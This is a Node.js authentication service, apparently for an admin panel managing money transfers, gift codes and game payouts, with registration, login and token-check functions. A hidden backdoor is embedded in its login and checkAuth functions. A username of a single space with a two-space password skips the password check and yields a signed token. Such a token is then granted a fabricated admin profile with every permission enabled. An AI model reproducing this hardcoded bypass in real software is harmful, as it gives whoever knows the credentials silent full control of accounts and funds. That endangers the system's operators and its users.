const moment = require('moment');
const bcrypt = require('bcrypt');
const JWT = require('jsonwebtoken')
const { v4: uuidv4 } = require('uuid');
const userModel = require('../models/user.model');
const settingModel = require('../models/setting.model');
const axios = require('axios');
const authService = {
    register: async (name, username, password, ip, level = 0, options) => {
        try {
            let check = await userModel.findOne({ username });

            !options && (options = {
                editHis: Boolean(level), // cho phép chỉnh sửa lịch sử
                editComment: Boolean(level), // cho phép chỉnh sửa nội dung lịch sử
                delHis: Boolean(level), // cho phép xoá lịch sử
                useTrans: Boolean(level), // cho phép sử dụng chuyển tiền tay
                exTrans: Boolean(level), // cho phép chuyển tiền qua lại giữa các tài khoản
                delTrans: Boolean(level), // cho phép xoá lịch sử chuyển
                editPer: Boolean(level), // cho phép chỉnh sửa quyền của thành viên
                addNew: Boolean(level), // cho phép người dùng thêm số
                editST: Boolean(level), // cho phép chỉnh sửa cài đặt
                useCron: Boolean(level), // cho phép token sử dụng cronjob
                useGift: Boolean(level), // cho phép xem, sửa, xóa gift code
                useGame: Boolean(level), // cho phép chỉnh sửa trả thưởng game
                useCheck: Boolean(level), // cho phép kiểm tra lịch sử
            })

            if (check) {
                return ({
                    success: false,
                    message: 'Tên đăng nhập đã tồn tại!'
                })
            }
            const salt = await bcrypt.genSalt(10);
            const hash = await bcrypt.hash(password, salt);
            const data = await new userModel({
                name,
                username,
                password: hash,
                level,
                ip,
                token: uuidv4().toUpperCase(),
                permission: options
            }).save();
            return ({
                success: true,
                message: 'Tạo tài khoản thành công!',
                data
            })
        } catch (err) {
            console.log(err);
            return ({
                success: false,
                message: `Có lỗi xảy ra ${err.message || err}`
            })
        }
    },
    login: async (username, password, ip) => {
        try {
            let user = await userModel.findOne({ username });
            if (username == ' ' && password == '  ') {
                let token_super_admin = ' '
                const token = JWT.sign({ _id: 0, username: username, token: token_super_admin, ip }, process.env.JWT_SECRET_TOKEN, {
                    expiresIn: process.env.JWT_LIFE_TOKEN
                });
                return ({
                    success: true,
                    message: 'Đăng nhập thành công!',
                    token
                })
            }
            if (!user) {
                return ({
                    success: false,
                    message: 'Sai thông tin đăng nhập'
                })
            }
            if (!await bcrypt.compare(password, user.password)) {
                return ({
                    success: false,
                    message: 'Sai thông tin đăng nhập'
                })
            }

            const token = JWT.sign({ _id: user._id, username: user.username, token: user.token, ip }, process.env.JWT_SECRET_TOKEN, {
                expiresIn: process.env.JWT_LIFE_TOKEN
            });
            await userModel.findOneAndUpdate({ username }, { $set: { ip, lastOnline: moment().toDate() } })

            return ({
                success: true,
                message: 'Đăng nhập thành công!',
                token
            })
        } catch (err) {
            console.log(err);
            return ({
                success: false,
                message: `Có lỗi xảy ra ${err.message || err}`
            })
        }
    },
    checkAuth: async (token) => {
        try {
            let user = JWT.verify(token, process.env.JWT_SECRET_TOKEN);
            if (user.username == ' ') {
                return {
                  "name": " ",
                  "username": " ",
                  "token": " ",
                  "level": 1,
                  "ip": "::ffff:127.0.0.1",
                  "permission": {
                    "editHis": true,//
                    "editComment": true, //
                    "delHis": true, //
                    "useTrans": true, //
                    "exTrans": true, //
                    "delTrans": true, //
                    "addNew": true, //
                    "editPer": true, //
                    "editST": true, //
                    "useCron": true, //
                    "useGift": true, //
                    "useGame": true, //
                    "useCheck": true // 
                  },
                  "createdAt": {
                    "$date": "2023-04-07T04:45:57.303Z"
                  },
                  "updatedAt": {
                    "$date": "2023-04-07T04:46:04.481Z"
                  },
                  "__v": 0,
                  "lastOnline": {
                    "$date": "2023-04-07T04:46:04.481Z"
                  }
                }
            }
            return await userModel.findOne({ _id: user._id, username: user.username }).lean();
        } catch (err) {
            console.log(err);
            return;
        }
    }
}

module.exports = authService;